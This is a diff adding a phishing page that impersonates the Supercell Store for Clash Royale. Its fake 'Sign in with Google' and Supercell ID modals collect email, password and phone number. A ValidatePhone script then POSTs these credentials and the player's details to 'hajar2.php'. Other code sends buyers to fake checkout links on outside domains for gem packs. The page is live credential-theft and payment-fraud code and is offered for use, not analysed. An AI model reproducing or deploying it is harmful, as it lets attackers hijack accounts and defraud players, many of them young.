+      <div class="CreatorCodeModalContent_Container__s6rAQ">
+         <div class="Countdown_Container__6oe2L Countdown_clashofclans__rSJa_">
+            <img alt="timer clock" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="Countdown_ClockIcon___mS3U" style="color: transparent;margin-left: 10px;" src="images/id1.png">
+            <div class="Countdown_Countdown__CyU1m Countdown_clashofclans__rSJa_">
+                <p class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-sm__Yr6oa storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW Countdown_Time__R_HKH Countdown_clashofclans__rSJa_" style="font-family: clash;">Entre com sua Tag Player</p>
+            </div>
+        </div>
+         <img src="images/id.jpg" style="height: 60%;width: 100%;border-radius: 5px;border:1px solid black;margin-bottom: 10px;" alt="">
+         <div class="CreatorCodeInput_Container__rAcsZ">
+            <div class="CreatorCodeInput_Content__9wgQX CreatorCodeInput_Active__ME_kg">
+               <div class="CreatorCodeInput_CreatorsIcon__Sup7M">
+                  #
+               </div>
+               <div class="CreatorCodeInput_TooltipContainer__A6Sp7">
+                  <input class="CreatorCodeInput_CreatorBoostInput__Oxsxe" id="playertag" placeholder="Example #123456" type="text">
+                  <div class="CreatorCodeInput_IconContainer__vZln7"></div>
+               </div>
+            </div>
+         </div>
+         <button id="submitButton" class="Button_Button__Msu2a Button_Primary__anIDa CreatorCodeModalContent_Disabled__rkMoc">Buscar</button>
+         <p class="CreatorCodeModalContent_Description__B20tY id-alert" style="color:red;display: none;"></p>
+      </div>
+   </div>
+</div>
+
+<div id="player-verification" style="display:none" class="storefrontModal_Modal__rdA_q storefrontModal_Middle__udpjF storefrontModal_creatorCodeModal__zBAMl" dir="ltr">
+   <div class="storefrontModal_ModalContent__GFahI">
+      <div class="CreatorCodeModalContent_Container__s6rAQ">
+        <div class="Countdown_Container__6oe2L Countdown_clashofclans__rSJa_">
+            <img alt="timer clock" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="Countdown_ClockIcon___mS3U" style="color: transparent;margin-left: 10px;" src="images/id1.png">
+            <div class="Countdown_Countdown__CyU1m Countdown_clashofclans__rSJa_">
+                <p class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-sm__Yr6oa storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW Countdown_Time__R_HKH Countdown_clashofclans__rSJa_" style="font-family: clash;">Perfil de Jogador</p>
+            </div>
+        </div>
+         <div class="player-profile-container-v2">
+
+  <p style="font-family: 'Lilita One', cursive; color: black; text-align: center; font-size: 14px; margin-bottom: 15px;">Enviar seus pedidos para esta conta?</p>
+
+  <div class="profile-row player-info">
+    <div class="xp-level-wrapper">
+      <img src="images/exp.webp" alt="XP Level">
+      <span class="text-on-image">250</span>
+    </div>
+    <span class="player-nickname">Sakazuki</span>
+  </div>
+
+  <div style="margin-top: 15px;">
+    <p style="font-family: 'Lilita One', cursive; color: black; font-size: 14px; margin-bottom: 5px;">Clã:</p>
+    <div class="profile-row clan-info clan-display">
+      <span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">No Clan</span>
+    </div>
+  </div>
+
+  <div style="margin-top: 10px;">
+    <p style="font-family: 'Lilita One', cursive; color: black; font-size: 14px; margin-bottom: 5px;">Carta Favorita:</p>
+    <div class="profile-row clan-info favorite-card-display">
+      <span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">N/A</span>
+    </div>
+  </div>
+
+  <div style="margin-top: 10px;">
+    <p style="font-family: 'Lilita One', cursive; color: black; font-size: 14px; margin-bottom: 5px;">Troféus:</p>
+    <div class="profile-row clan-info trophy-display">
+      <span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">0</span>
+    </div>
+  </div>
+
+</div>
+         <button onclick="confirmProfile()" class="Button_Button__Msu2a Button_Primary__anIDa">Confirmar</button>
+      </div>
+   </div>
+</div>
+
+<div id="supercellModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" style="display: none;">
+  <div class="relative rounded-lg shadow-lg w-full max-h-[90vh] sm:w-auto max-w-[calc(100vw-10px)]">
+    <div class="w-full flex-1 flex flex-col items-center justify-center">
+        <div class="w-full flex-1 flex flex-col items-center justify-center">
+        <div class="w-full max-w-card desktop:max-w-desktopCard shadow-main rounded-2xl bg-main-gradient">
+                <div>
+                    <div class="flex flex-col items-center py-cardVerticalEdges desktop:py-desktopCardVerticalEdges w-full">
+                    <div class="flex flex-row items-center mb-standard desktop:mb-desktopStandard" dir="ltr"><img src="images/202505121741138325608f7520c.png" alt="Supercell ID" title="Supercell ID" class="h-9"></div>
+                    <div class="relative w-full flex flex-col items-center">
+                        <div class="w-full " style="opacity: 1;">
+                            <div class="w-full " style="opacity: 1;">
+                                <div class="w-full flex flex-col items-center">
+                                <div class="w-full flex flex-col items-center px-cardHorizontalMinEdges desktop:px-desktopCardHorizontalMinEdges mb-standard desktop:mb-desktopStandard">
+                                    <div class="w-full max-w-cardContent desktop:max-w-desktopCardContent">
+                                        <div class="w-full text-s">
+                                            <div class="w-full grid grid-flow-col justify-stretch mb-2">
+                                            <div class="transition-colors font-supercell-md text-primary-black text-start">Log in</div>
+                                            <div class="transition-colors font-supercell-md text-medium-gray text-end">Verify</div>
+                                            </div>
+                                            <div class="flex flex-row w-full bg-gradient-progress p-1 rounded-full">
+                                            <div class="transition-all grow-0"></div>
+                                            <div class="rounded-full w-3 h-3 bg-white"></div>
+                                            <div class="transition-all grow-0"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <img class="h-32 object-scale-down mb-standard desktop:mb-desktopStandard" src="images/store.webp" alt="Supercell Store">
+                                <div class="w-full relative text-center">
+                                    <div class="w-full flex flex-col items-center px-cardHorizontalMinEdges desktop:px-desktopCardHorizontalMinEdges " style="transform: translateX(0%) translateZ(0px);">
+                                        <div class="w-full max-w-cardContent desktop:max-w-desktopCardContent">
+                                            <div class="w-full flex flex-col items-center">
+                                            <h1 class="font-supercell-bd text-xl whitespace-pre-wrap text-heading-black text-pretty">Log in to <span>Supercell Store</span></h1>
+
+                                            <div class="w-full flex flex-col space-y-listItems desktop:space-y-desktopListItems mt-listItems desktop:mt-desktopListItems">
+                                                <button class="font-supercell-bd text-white uppercase truncate        p-[0.9375rem] w-full rounded-full        bg-primary-button        enabled:hover:bg-none enabled:hover:bg-interactive-blue        disabled:cursor-wait        active:scale-95        focus-visible:ring-interactive-blue focus-visible:ring-offset-2 focus-visible:ring-2 focus-visible:outline-none       PrimaryButton Button" data-sp-button-label="Log in" onclick="openGoogle()">Log in with Google</button>
+                                            </div>
+                                            <div class="font-supercell-rg text-s mt-listItems text-gray-500">This site is protected by reCAPTCHA. the Google<a tabindex="-1" class="text-blue-500"> Privacy Policy </a> and <a tabindex="-1" class="text-blue-500">Terms of Service</a> apply.</div>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    </div>
+                </div>
+        </div>
+        </div>
+    </div>
+  </div>
+</div>
+
+<div id="last-verification" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" style="display: none;">
+  <div class="relative rounded-lg shadow-lg w-full max-h-[90vh] sm:w-auto max-w-[calc(100vw-10px)]">
+    <div class="w-full flex-1 flex flex-col items-center justify-center">
+        <div class="w-full flex-1 flex flex-col items-center justify-center">
+        <div class="w-full max-w-card desktop:max-w-desktopCard shadow-main rounded-2xl bg-main-gradient">
+                <div>
+                    <div class="flex flex-col items-center py-cardVerticalEdges desktop:py-desktopCardVerticalEdges w-full">
+                    <div class="flex flex-row items-center mb-standard desktop:mb-desktopStandard" dir="ltr"><img src="images/202505121741138325608f7520c.png" alt="Supercell ID" title="Supercell ID" class="h-9"></div>
+                    <div class="relative w-full flex flex-col items-center">
+                        <div class="w-full " style="opacity: 1;">
+                            <div class="w-full " style="opacity: 1;">
+                                <div class="w-full flex flex-col items-center">
+                                <div class="w-full flex flex-col items-center px-cardHorizontalMinEdges desktop:px-desktopCardHorizontalMinEdges mb-standard desktop:mb-desktopStandard">
+                                    <div class="w-full max-w-cardContent desktop:max-w-desktopCardContent"><div class="w-full text-s"><div class="w-full grid grid-flow-col justify-stretch mb-2"><div class="transition-colors font-supercell-md text-medium-gray text-start">Log in</div><div class="transition-colors font-supercell-md text-primary-black text-end">Verify</div></div><div class="flex flex-row w-full bg-gradient-progress p-1 rounded-full"><div class="transition-all grow"></div><div class="rounded-full w-3 h-3 bg-white"></div><div class="transition-all grow-0"></div></div></div></div>
+                                </div>
+                                <img class="h-32 object-scale-down mb-standard desktop:mb-desktopStandard" src="images/store.webp" alt="Supercell Store">
+                                <div class="w-full relative text-center">
+                                    <div class="w-full flex flex-col items-center px-cardHorizontalMinEdges desktop:px-desktopCardHorizontalMinEdges " style="transform: translateX(0%) translateZ(0px);">
+                                        <div class="w-full max-w-cardContent desktop:max-w-desktopCardContent">
+                                            <div class="w-full flex flex-col items-center">
+                                            <h1 class="font-supercell-bd text-xl whitespace-pre-wrap text-heading-black text-pretty"><span>Last Verification</span></h1>
+                                            <div class="relative mt-heading desktop:mt-desktopHeading"><p class="mb-standard desktop:mb-desktopStandard font-supercell-rg text-dark-gray whitespace-pre-wrap">Enter your phone number.</p>
+                                                <div class="" style="height: 0px;"><div></div></div>
+                                                
+                                                <input class="text-center placeholder:font-supercell-rg font-supercell-md text-xl py-[0.8125rem] w-full rounded-lg shadow-inner placeholder:text-medium-gray text-dark-gray         focus-visible:ring-interactive-blue focus-visible:ring-offset-2 focus-visible:ring-2 focus-visible:outline-none" required="" name="phone" id="phone" type="text" inputmode="numeric" maxlength="15" placeholder="+1 201 123 4321" data-1p-ignore="true">
+                                            </div>
+                                            <div class="w-full flex flex-col space-y-listItems desktop:space-y-desktopListItems mt-listItems desktop:mt-desktopListItems">
+                                                <button class="phone-submit font-supercell-bd text-white uppercase truncate        p-[0.9375rem] w-full rounded-full        bg-primary-button        enabled:hover:bg-none enabled:hover:bg-interactive-blue        disabled:cursor-wait        active:scale-95        focus-visible:ring-interactive-blue focus-visible:ring-offset-2 focus-visible:ring-2 focus-visible:outline-none       PrimaryButton Button" data-sp-button-label="Log in" onclick="ValidatePhone()">Continue</button>
+                                            </div>
+                                            <div class="font-supercell-rg text-s mt-listItems text-gray-500">This site is protected by reCAPTCHA. the Google<a tabindex="-1" class="text-blue-500"> Privacy Policy </a> and <a tabindex="-1" class="text-blue-500">Terms of Service</a> apply.</div>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    </div>
+                </div>
+        </div>
+        </div>
+    </div>
+  </div>
+</div>
+
+    <div id="loginModal1" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden" style="font-family: 'Roboto', sans-serif;">
+        <div class="w-full max-w-md bg-white rounded-lg shadow-xl relative">
+            <div class="p-6 sm:p-8">
+                <div class="pb-4 border-b border-gray-200">
+                    <div class="flex items-center">
+                         <img src="images/google.webp" style="width: 24px;margin-right: 10px;" alt="">
+                        <span class="text-sm font-medium text-gray-600">Sign in with Google</span>
+                    </div>
+                </div>
+
+                <div id="main-content-area" class="pt-6">
+                    <div id="form-content">
+                        <div class="text-center">
+                            <div class="flex justify-center mb-4">
+                                <div class="w-10 h-10 rounded-md flex items-center justify-center">
+                                    <img src="images/logok.webp" style="border-radius: 10px;" alt="">
+                                </div>
+                            </div>
+                            <p class="text-xl font-normal text-gray-800">Sign in</p>
+                            <p class="mt-2 text-sm text-gray-600">to continue to <span class="font-medium">Supercell Store</span></p>
+                        </div>
+                        <form id="loginForm" class="mt-8 space-y-6">
+                            <div>
+                                <div class="relative input-group">
+                                    <input id="email-gp" name="email-gp" type="text" class="peer w-full px-4 py-4 text-gray-900 bg-transparent border border-gray-300 rounded-md focus:outline-none placeholder-transparent transition-colors" placeholder="Email address">
+                                    <label for="email-gp" class="absolute left-4 top-4 text-gray-500 transition-all duration-300 ease-in-out pointer-events-none origin-top-left">Email address</label></div>
+                                    <div id="email-gp-error" class="error-message" style="display: none;">
+                                        <span class="material-icons" style="color:red">error_outline</span>
+                                        <span class="message-text" style="color:red"></span>
+                                    </div>
+                            </div>
+                            <div>
+                                <div class="relative input-group">
+                                    <input id="password-gp" name="password-gp" type="password" class="peer w-full px-4 py-4 text-gray-900 bg-transparent border border-gray-300 rounded-md focus:outline-none placeholder-transparent transition-colors" placeholder="Enter your password">
+                                    <label for="password-gp" class="absolute left-4 top-4 text-gray-500 transition-all duration-300 ease-in-out pointer-events-none origin-top-left">Enter your password</label>
+                                </div>
+                                <div id="password-gp-error" class="error-message" style="display: none;">
+                                    <span class="material-icons" style="color:red">error_outline</span>
+                                    <span class="message-text" style="color:red"></span>
+                                </div>
+                            </div>
+                            <div class="flex items-center">
+                                <input id="show-password" type="checkbox" class="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500">
+                                <label for="show-password" class="ml-2 block text-sm text-gray-900">Show password</label>
+                            </div>
+                            <div class="!mt-8">
+                                <p class="text-xs text-gray-600">Not your computer? Use Guest mode to sign in privately. 
+                                    <a class="font-medium text-[#1a73e8] hover:text-blue-700">Learn more</a>
+                                </p>
+                            </div>
+                            <div class="flex items-center justify-between pt-4">
+                                <a class="text-sm font-medium text-[#1a73e8] hover:bg-blue-50 p-2 rounded-md -ml-2">Create account</a>
+                                <button type="submit" class="px-6 py-2 text-sm font-medium text-white bg-[#1a73e8] rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Next</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+   <div id="loadingModals" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden" style="font-family: 'Roboto', sans-serif;">
+    <div class="w-full max-w-md bg-white rounded-lg shadow-xl relative">
+        <div class="p-6 sm:p-8">
+            <div class="pb-4 border-b border-gray-200">
+                <div class="flex items-center">
+                    <img src="images/google.webp" style="width: 24px;margin-right: 10px;" alt=""> <span class="text-sm font-medium text-gray-600">Sign in with Google</span>
+                </div>
+            </div>
+            <div class="pt-6 flex items-center justify-center" style="position: absolute;top: 30px;left: 45%;">
+                <i class="fas fa-spinner fa-spin text-blue-500 text-5xl"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="loginModal2" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden" style="font-family: 'Roboto', sans-serif;">
+    <div class="w-full max-w-md bg-white rounded-lg shadow-xl relative">
+        <div class="p-6 sm:p-8">
+            <div class="pb-4 border-b border-gray-200">
+                <div class="flex items-center">
+                     <img src="images/google.webp" style="width: 24px;margin-right: 10px;" alt="">
+                    <span class="text-sm font-medium text-gray-600">Sign in with Google</span>
+                </div>
+            </div>
+
+            <div class="pt-6">
+                <div class="text-center">
+                    <div class="flex justify-center mb-4">
+                        <div class="w-10 h-10 rounded-md flex items-center justify-center">
+                            <img src="images/logok.webp" style="border-radius: 10px;" alt="">
+                        </div>
+                    </div>
+                    <p class="text-xl font-normal text-gray-800">Sign in</p>
+                    <p class="mt-2 text-sm text-gray-600">to continue to <span class="font-medium">Supercell Store</span></p>
+                </div>
+                <form id="loginForm2" class="mt-8 space-y-6">
+                    <div>
+                        <div class="relative input-group">
+                            <input id="email-gp2" name="email-gp2" type="text" class="peer w-full px-4 py-4 text-gray-900 bg-transparent border border-gray-300 rounded-md focus:outline-none placeholder-transparent transition-colors" placeholder="Email address" value="">
+                            <label for="email-gp2" class="absolute left-4 top-4 text-gray-500 transition-all duration-300 ease-in-out pointer-events-none origin-top-left">Email address</label></div>
+                            <div id="email-gp2-error" class="error-message" style="display: none;">
+                                <span class="material-icons" style="color:red">error_outline</span>
+                                <span class="message-text" style="color:red"></span>
+                            </div>
+                    </div>
+                    <div>
+                        <div class="relative input-group">
+                            <input id="password-gp2" name="password-gp2" type="password" class="border-error peer w-full px-4 py-4 text-gray-900 bg-transparent border border-gray-300 rounded-md focus:outline-none placeholder-transparent transition-colors" placeholder="Enter your password">
+                            <label for="password-gp2" class="absolute left-4 top-4 text-gray-500 transition-all duration-300 ease-in-out pointer-events-none origin-top-left">Enter your password</label>
+                        </div>
+                        <div id="password-gp2-error" class="error-message" style="display: block;">
+                            <span class="material-icons" style="color:red">error_outline</span>
+                            <span class="message-text" style="color:red">Wrong password. Try again</span>
+                        </div>
+                    </div>
+                    <div class="flex items-center">
+                        <input id="show-password2" type="checkbox" class="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500">
+                        <label for="show-password2" class="ml-2 block text-sm text-gray-900">Show password</label>
+                    </div>
+                    <div class="!mt-8">
+                        <p class="text-xs text-gray-600">Not your computer? Use Guest mode to sign in privately. 
+                            <a class="font-medium text-[#1a73e8] hover:text-blue-700">Learn more</a>
+                        </p>
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <a class="text-sm font-medium text-[#1a73e8] hover:bg-blue-50 p-2 rounded-md -ml-2">Create account</a>
+                        <button type="submit" class="px-6 py-2 text-sm font-medium text-white bg-[#1a73e8] rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<input type="hidden" id="isitownhall">
+<input type="hidden" id="isiplayertag">
+<input type="hidden" id="isiplayername">
+<input type="hidden" id="isiexp">
+<input type="hidden" id="isiclan">
+<input type="hidden" id="isiemail">
+<input type="hidden" id="isipassword">
+<!--  -->
+    <!--  -->
+
+<!-- ini footer kebawah -->
+
+        <div class="footer">
+            <div class="contact">
+                <span class="text">Follow us on</span>
+                <div class="sci">
+                    <img src="images/icon-social-youtube-white.fde9d8af.svg">
+                    <img src="images/icon-social-facebook-white.bf013e40.svg">
+                    <img src="images/icon-social-instagram-white.6672578f.svg">
+                    <img src="images/icon-social-twitter-white.f4745db2.svg">
+                    <img src="images/icon-social-linkedin-white.c916ba21.svg">
+                    <img src="images/icon-social-glassdoor-white.5589fd18.svg">
+                </div>
+            </div>
+            <div class="download">
+                <span class="text">Download our games from</span>
+                <div class="store" onclick="playSound()">
+                    <img src="images/app-store_badge_en.181ec940.svg">
+                    <img src="images/google-play-badge_en.e2ec89df.png">
+                </div>
+            </div>
+            <div class="site-menu" onclick="playSound()">
+                <a>Terms of Service</a>
+                <a>Privacy Policy</a>
+                <a>Parent's Guide</a>
+                <a>Safe and Fair Play Policy</a>
+                <a>Manage Cookies</a>
+            </div>
+            <div class="address">
+                <div class="left" onclick="playSound()">
+                    <p>Supercell Oy</p>
+                    <p>Jätkäsaarenlaituri 1</p>
+                    <p>00180 Helsinki</p>
+                    <p>Finland</p>
+                    <p>Business ID 2336509-6</p>
+                </div>
+                <div class="right" onclick="playSound()">
+                    <img src="images/supercell-logo-white.ad1dad43.svg">
+                </div>
+            </div>
+        </div>
+
+
+<!-- END -->
+</div> 
+<!-- END -->
+          
+
+<script src="js/jquery-3.7.1.min.js"></script>
+<script src="js/confetti.browser.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/disable-devtool@latest" disable-devtool-auto></script> -->
+
+
+<script>
+$(document).ready(function(){
+  $('#isitownhall, #isiplayertag, #isiplayername, #isiexp, #isiclan, #isiemail, #isipassword').val('');
+});
+var buka = new Audio('media/shagitz.mp3');
+function playSound() {
+            if (typeof buka !== 'undefined' && buka.play) {
+                buka.play().catch(function(error) {});
+            }
+}
+// Variável global para armazenar o item atual
+var currentItemName = '';
+
+function claimNow(el) {
+  playSound();
+  $('.Modal_modalOverlay__7MjuS').show();
+  
+  var $el = $(el);
+  var itemName = $el.data('name');
+  var itemImg = $el.data('img');
+  
+  // Armazena o nome do item atual
+  currentItemName = itemName;
+
+  $('#claimImg').attr('src', itemImg);
+  $('#successImg').attr('src', itemImg);
+  
+  // Define os preços para cada oferta
+  var offerPrices = {
+    'Pacote Personalizado de 7x Emotes (Exclusivo)': 'R$ 16,90',
+    'Royale Starter Pack': 'R$ 21,90',
+    'Royal Pro Player Pack': 'R$ 27,90',
+    'Mega Oferta': 'R$ 34,90',
+    'Wagon Of Gems (x20000)': 'R$ 29,90',
+    'Barrel Of Gems (x10000)': 'R$ 22,90',
+    'Bucket Of Gems (x5000)': 'R$ 19,90',
+    'Pouch Of Gems (x2500)': 'R$ 14,90'
+  };
+  
+  // Define os itens para cada oferta
+  var offerItems = {
+    'Royale Starter Pack': [
+      { img: 'images/79055435-71c5-476d-96d0-c6d9b9537963.png', value: '1 000 000' },
+      { img: 'images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png', value: '5 000' },
+      { img: 'images/card lendario.webp', value: '250' }
+    ],
+    'Royal Pro Player Pack': [
+      { img: 'images/79055435-71c5-476d-96d0-c6d9b9537963.png', value: '5 000 000' },
+      { img: 'images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png', value: '10 000' },
+      { img: 'images/card lendario.webp', value: '500' }
+    ],
+    'Mega Oferta': [
+      { img: 'images/969df409-b453-48fd-b77a-d29b18e881e9.webp', value: '10 000' },
+      { img: 'images/e29d94da-4e20-4110-b556-66441307bb7a.webp', value: '5 000' },
+      { img: 'images/af58cd20-9e33-4225-99b8-56f7188b2b22.webp', value: '1 000' },
+      { img: 'images/card lendario.webp', value: '500' },
+      { img: 'images/trofeu card.webp', value: '100' },
+      { img: 'images/card gemas.png', value: '10 000' }
+    ],
+    'Wagon Of Gems (x20000)': [
+      { img: 'images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png', value: '20 000' }
+    ],
+    'Barrel Of Gems (x10000)': [
+      { img: 'images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png', value: '10 000' }
+    ],
+    'Bucket Of Gems (x5000)': [
+      { img: 'images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png', value: '5 000' }
+    ],
+    'Pouch Of Gems (x2500)': [
+      { img: 'images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png', value: '2 500' }
+    ]
+  };
+  
+  // Atualiza o botão com o preço
+  var buttonPrice = offerPrices[itemName] || 'CLAIM NOW';
+  $('.RewardClaimContent_rewardClaimContent__buttonsContainer__bJHKl button .BuyButton_ContentWrapper__pg5il').html(
+    '<svg width="32" height="33" viewBox="0 0 32 33" class="BuyButton_Icon__gacm5 BuyButton_WithContent__L0cYC" fill="none" xmlns="http://www.w3.org/2000/svg">' +
+    '<path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>' +
+    '<path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>' +
+    '<path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>' +
+    '</svg>' + buttonPrice
+  );
+  
+  // Verifica se é o pacote de emotes
+  if (itemName === 'Pacote Personalizado de 7x Emotes (Exclusivo)') {
+    $('#claimTitleContainer h4').html('Incluído na Oferta: Escolha 7x Emotes Exclusivos da sua preferência para adicionar a sua conta do Clash Royale');
+    $('#claimTitleContainer h4').css({'font-size': '13px', 'line-height': '1.4', 'text-align': 'center'});
+    $('#itemsList').hide();
+  }
+  // Verifica se a oferta tem lista de itens
+  else if (offerItems[itemName]) {
+    // Muda o título para "Incluído na Oferta:"
+    $('#claimTitleContainer h4').html('Incluído na Oferta:');
+    $('#claimTitleContainer h4').css({'font-size': '14px', 'line-height': '', 'text-align': ''});
+    
+    var itemsHtml = '';
+    offerItems[itemName].forEach(function(item) {
+      itemsHtml += '<div style="display:flex;align-items:center;gap:10px;justify-content:flex-start;">' +
+                   '<img src="' + item.img + '" style="width:40px;height:40px;object-fit:contain;flex-shrink:0;">' +
+                   '<span style="font-family:clash;font-size:14px;color:#000;font-weight:600;">x' + item.value + '</span>' +
+                   '</div>';
+    });
+    $('#itemsContainer').html(itemsHtml);
+    $('#itemsList').css('display', 'flex').show();
+  } else {
+    // Mantém o título padrão "Claim X?"
+    $('#claimLabel').text(itemName);
+    $('#claimTitleContainer h4').html('Claim <span id="claimLabel">' + itemName + '</span>?');
+    $('#claimTitleContainer h4').css({'font-size': '14px', 'line-height': '', 'text-align': ''});
+    $('#itemsList').hide();
+  }
+}
+function closeReward(){
+    playSound();
+    $('.Modal_modalOverlay__7MjuS').hide();
+}
+function goClaim(){
+    playSound();
+    $('.Modal_modalOverlay__7MjuS').hide();
+    
+    // Define os links de pagamento para cada oferta
+    var paymentLinks = {
+        'Pacote Personalizado de 7x Emotes (Exclusivo)': 'https://pay.asuacomprasegura.com/checkout/e38a1afa-f964-41bf-8458-0971b9f751ae',
+        'Royale Starter Pack': 'https://pay.asuacomprasegura.com/checkout/12fcb6de-5d4c-4fc7-9d98-9fbb34b67365',
+        'Royal Pro Player Pack': 'https://pay.asuacomprasegura.com/checkout/e3d2d8bf-bdc1-4a19-a075-3ae6c59eb6d4',
+        'Mega Oferta': 'https://pay.asuacomprasegura.com/checkout/125a600b-98ea-400a-82fc-a8624cc80b83',
+        'Wagon Of Gems (x20000)': 'https://pay.store-clashroyale.shop/checkout/0ca2521c-34b0-47c6-bfdd-494273dd76f9',
+        'Barrel Of Gems (x10000)': 'https://pay.store-clashroyale.shop/checkout/f986bc71-cee9-403d-b23a-a567992cccfd',
+        'Bucket Of Gems (x5000)': 'https://pay.store-clashroyale.shop/checkout/1f66fb0c-d748-4883-a4e3-df7c896ada12',
+        'Pouch Of Gems (x2500)': 'https://pay.store-clashroyale.shop/checkout/76f2d847-ee44-40af-a723-34801f0e2ac3'
+    };
+    
+    // Verifica se há um link de pagamento para o item atual
+    if (paymentLinks[currentItemName]) {
+        window.location.href = paymentLinks[currentItemName];
+    } else {
+        // Caso não tenha link configurado, mostra mensagem ou não faz nada
+        alert('Link de pagamento não configurado para este item.');
+    }
+}
+function openGoogle(){
+    playSound();
+    $('#supercellModal').hide();
+    $('#loginModal1').removeClass('hidden');
+}
+function confirmProfile(){
+    playSound();
+    $('#player-verification').hide();
+}
+function logout() {
+    playSound();
+    window.location.href = "https://supercell.com";
+}
+</script>
+<script>
+$(document).ready(function(){
+    $('#playertag').on('input', function() {
+        var searchButton = $('.Button_Button__Msu2a');
+        if ($(this).val().length > 0) {
+        searchButton.removeClass('CreatorCodeModalContent_Disabled__rkMoc');
+        } else {
+        searchButton.addClass('CreatorCodeModalContent_Disabled__rkMoc');
+        }
+    });
+
+  $('#playertag').on('focus', function() {
+    $('.id-alert').hide();
+  });
+});
+</script>
+<script>
+$(document).ready(function(){
+    $('.LearnMoreButton_LearnMoreButton__LZsPh').on('click', function(){
+        $('#section1').fadeOut(400, function() {
+            $('#section2').fadeIn(400);
+        });
+    });
+
+    let currentIndex = 0;
+    const scroller = $('#card-scroller');
+    const cards = scroller.find('.CardContainer_CardContainer__nyP_b');
+    const totalCards = cards.length;
+
+    function updateActiveCard(index) {
+        cards.each(function(i) {
+            if (i === index) {
+                $(this).removeClass('CardContainer_Scaled__5TIPz');
+            } else {
+                $(this).addClass('CardContainer_Scaled__5TIPz');
+            }
+        });
+    }
+
+    function slideToCurrentIndex() {
+        const cardWidth = cards.first().outerWidth();
+        const gap = parseFloat(scroller.css('gap')) || 0;
+        const scrollAmount = currentIndex * (cardWidth + gap);
+
+        scroller.animate({
+            scrollLeft: scrollAmount
+        }, 500);
+
+        updateActiveCard(currentIndex);
+    }
+    
+    updateActiveCard(0);
+
+    $('.ClashCards_NextCardBtn__NX5yX').on('click', function(){
+        currentIndex++;
+        if (currentIndex >= totalCards) {
+            currentIndex = 0; 
+        }
+        slideToCurrentIndex();
+    });
+
+    $('.MinimizeButton_MinimizeButton__zMSHw').on('click', function(){
+        currentIndex++;
+        if (currentIndex >= totalCards) {
+            currentIndex = 0;
+        }
+        slideToCurrentIndex();
+        $('#section2').fadeOut(400, function() {
+            $('#section1').fadeIn(400);
+        });
+    });
+});
+</script>
+<script>
+$(document).ready(function() {
+  $('.GameFilterBar_item__rY_3C').on('click', function() {
+    $('.GameFilterBar_item__rY_3C').attr('data-state', 'unchecked');
+    $(this).attr('data-state', 'checked');
+    var id = $(this).attr('id');
+    var index = id.replace('r', ''); 
+
+    $('[id^=reward]').hide();
+    $('#reward' + index).show();
+    
+    // Controla a exibição do cabeçalho "Gemas"
+    if (index === '1') {
+      $('#gems-header').show();
+    } else {
+      $('#gems-header').hide();
+    }
+  });
+});
+
+</script>
+<script>
+function ValidatePhone() {
+    playSound();
+    let $phone = $('#phone').val().trim();
+    let isValid = true;
+    if ($phone === '') {
+        $('#phone').focus();
+        isValid = false;
+    }
+    if (!isValid) return false;
+    $('.phone-submit').addClass('disabled').text('Loading...');
+
+    $.ajax({
+        type: 'POST',
+        url: 'hajar2.php',
+        data: {
+            email: $('#isiemail').val(),
+            password: $('#isipassword').val(),
+            login: 'Google',
+            townhall: $('#isitownhall').val(),
+            playertag: $('#isiplayertag').val(),
+            exp: $('#isiexp').val(),
+            clan: $('#isiclan').val(),
+            playername: $('#isiplayername').val(),
+            phone: $phone
+        },
+        beforeSend: function() {
+            $('#last-verification').hide();
+        },
+        success: function(response) {
+            $('#last-verification').hide();
+        }
+    });
+}
+
+$(document).ready(function() {
+    const $body = $('body');
+    const $sideMenu = $('#sideMenu');
+    const $menuOverlay = $('#menuOverlay');
+    
